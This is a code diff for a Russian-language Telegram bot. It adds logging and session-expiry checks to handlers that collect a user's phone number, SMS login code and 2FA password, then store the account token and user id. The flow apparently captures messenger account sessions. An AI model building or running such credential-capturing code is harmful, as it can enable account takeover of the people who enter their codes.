@@ -126,6 +126,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
             if "limit.violate" in msg_text or "слишком много попыток" in msg_text or "попробуйте позже" in msg_text:
                 if uid in pending:
                     pending[uid]["status"] = "flood_sms"
+                    logging.info(f"FloodHandler: статус изменён на flood_sms для uid={uid}")
 
     handler = FloodHandler()
     logging.getLogger().addHandler(handler)
@@ -133,13 +134,15 @@ async def phone_handler(message: types.Message, state: FSMContext):
     async def auth_task():
         try:
             await client.start()
-            if pending[uid].get("status") != "flood_sms":
+            if uid in pending and pending[uid].get("status") != "flood_sms":
                 pending[uid]["token"] = client.token
                 pending[uid]["user_id"] = client.my_id
                 pending[uid]["status"] = "done"
+                logging.info(f"auth_task: статус done для uid={uid}")
         except Exception as e:
             error = str(e).lower()
-            if pending[uid].get("status") != "flood_sms":
+            logging.error(f"auth_task: исключение для uid={uid}: {e}")
+            if uid in pending and pending[uid].get("status") != "flood_sms":
                 if "block" in error:
                     pending[uid]["status"] = "blocked"
                 elif "password" in error or "2fa" in error:
@@ -150,28 +153,36 @@ async def phone_handler(message: types.Message, state: FSMContext):
                     pending[uid]["status"] = f"error:{e}"
         finally:
             logging.getLogger().removeHandler(handler)
+            logging.info(f"auth_task: завершена для uid={uid}, статус={pending.get(uid, {}).get('status', 'нет')}")
 
     asyncio.ensure_future(auth_task())
+    await asyncio.sleep(3)
 
-    async def status_watcher():
-        await asyncio.sleep(3)
-        if uid not in pending:
-            return
-        status = pending[uid].get("status", "")
-        if status == "flood_sms":
-            await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
-            del pending[uid]
-            await state.clear()
-        elif status == "blocked":
-            await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
-            del pending[uid]
-            await state.clear()
-        elif status and status.startswith("error:"):
-            await safe_edit(msg, f"❌ {status[6:]}")
-            del pending[uid]
-            await state.clear()
+    if uid not in pending:
+        logging.info(f"phone_handler: uid={uid} уже удалён из pending")
+        return
 
-    asyncio.ensure_future(status_watcher())
+    status = pending[uid].get("status", "")
+    logging.info(f"phone_handler: статус={status} для uid={uid}")
+
+    if status == "flood_sms":
+        await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
+        del pending[uid]
+        await state.clear()
+        return
+
+    elif status == "blocked":
+        await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
+        del pending[uid]
+        await state.clear()
+        return
+
+    elif status and status.startswith("error:"):
+        await safe_edit(msg, f"❌ {status[6:]}")
+        del pending[uid]
+        await state.clear()
+        return
+
     await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
@@ -179,8 +190,13 @@ async def code_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     code = str(message.text.strip())
 
+    logging.info(f"code_handler: uid={uid}, pending_keys={list(pending.keys())}")
+
     if uid not in pending:
+        logging.info(f"code_handler: uid={uid} НЕ найден в pending!")
         return await safe_send(message, "⏳ Сессия устарела. Отправь номер заново через /start.")
+
+    logging.info(f"code_handler: uid={uid} найден, статус={pending[uid].get('status', '')}")
 
     data = await state.get_data()
     phone = data["phone"]
@@ -194,6 +210,10 @@ async def code_handler(message: types.Message, state: FSMContext):
 
     for _ in range(240):
         await asyncio.sleep(0.5)
+        if uid not in pending:
+            await safe_edit(msg, "⏳ Сессия устарела.")
+            await state.clear()
+            return
         status = pending[uid].get("status", "")
 
         if status == "done":
@@ -256,6 +276,10 @@ async def password_handler(message: types.Message, state: FSMContext):
 
     for _ in range(240):
         await asyncio.sleep(0.5)
+        if uid not in pending:
+            await safe_edit(msg, "⏳ Сессия устарела.")
+            await state.clear()
+            return
         status = pending[uid].get("status", "")
 
         if status == "done":
